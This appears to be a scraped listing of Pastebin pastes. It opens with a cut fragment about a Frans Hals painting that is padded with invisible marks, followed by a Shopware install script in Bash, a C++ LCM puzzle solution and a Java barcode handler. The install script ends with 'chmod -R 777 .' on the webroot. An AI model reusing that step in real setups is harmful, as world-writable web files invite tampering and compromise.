‎b‎e‎e‎r‎,‎ ‎w‎h‎i‎c‎h‎ ‎d‎e‎p‎i‎c‎t‎s‎ ‎a‎ ‎m‎o‎d‎i‎f‎i‎e‎d‎ ‎v‎e‎r‎s‎i‎o‎n‎ ‎o‎f‎ ‎t‎h‎e‎ ‎c‎a‎v‎a‎l‎i‎e‎r‎ ‎e‎n‎j‎o‎y‎i‎n‎g‎ ‎a‎ ‎g‎l‎a‎s‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎d‎r‎i‎n‎k‎.‎ ‎T‎h‎e‎ ‎p‎a‎i‎n‎t‎i‎n‎g‎ ‎i‎s‎ ‎n‎o‎w‎ ‎h‎o‎u‎s‎e‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎W‎a‎l‎l‎a‎c‎e‎ ‎C‎o‎l‎l‎e‎c‎t‎i‎o‎n‎ ‎i‎n‎ ‎L‎o‎n‎d‎o‎n‎.‎

P‎a‎i‎n‎t‎i‎n‎g‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎F‎r‎a‎n‎s‎ ‎H‎a‎l‎s‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

B‎y‎e‎,‎ ‎g‎u‎y‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎s‎k‎a‎t‎e‎b‎o‎a‎r‎d‎ ‎o‎n‎ ‎t‎h‎e‎ ‎r‎o‎o‎f‎.‎"
vrwsp6Eu,Install Shopware,Justman10000,Bash,Friday 22nd of December 2023 07:43:07 AM CDT,"# You need PHP (https://pastebin.com/4dBrYLXT)

# Replace WEBROOT
mkdir WEBROOT
cd WEBROOT
git init
git pull https://github.com/shopware/shopware.git

sed -i 's/    \""preinstall\"": \""node src/scripts/validate-package-json/index.mjs\"",//g' src/Administration/Resources/app/administration/package.json
sed -i 's/    \""node\"": \""^20.0.0\"",/    \""node\"": \""^21.0.0\"",/g' src/Administration/Resources/app/administration/package.json

yarn --cwd src/Administration/Resources/app/administration

composer install
composer run build:js

mkdir config/jwt
chmod -R 777 ."
hbmZ0rvb,I want Long Long Salary,Junaid_Hossain,C++,Friday 22nd of December 2023 07:31:40 AM CDT,"#include <bits/stdc++.h>
using namespace std;
#define ul unsigned long long int

ul findlcm(vector<ul> salaries, ul size)
{
    ul lcm = salaries[0];

    for (int i = 1; i < size; i++)
    {
        lcm = (((salaries[i] * lcm)) /
               (gcd(salaries[i], lcm)));
    }

    return lcm;
}

int main()
{
    int t;
    cin >> t;

    while (t--)
    {
        ul size, startingSalary;
        cin >> size >> startingSalary;
        vector<ul> salaries;

        for (ul i = 0; i < size; i++)
        {
            int temp;
            cin >> temp;
            salaries.push_back(temp);
        }

        salaries.push_back(startingSalary);

        ul common = findlcm(salaries, size + 1);

        cout << (common / startingSalary) - 1 << endl;
    }
}"
3w0vYKKv,Process Bar Code separate from Display Message,JeffGrigg,Java 5,Friday 22nd of December 2023 07:29:16 AM CDT,"    public void onBarcode(final String barcode) {
        final var message = processBarcode(barcode);
        display.displayMessage(message);
    }

    private String processBarcode(final String barcode) {
        if (barcode.isEmpty()) {
            return display.getDisplayEmptyBarcodeMessage();
        } else {

            final Price price = catalog.findPrice(barcode);

            if (price == null) {
                return display.getDisplayProductNotFoundMessage(barcode);
            } else {
                return display.getDisplayPriceMessage(price);
            }
        }
    }"
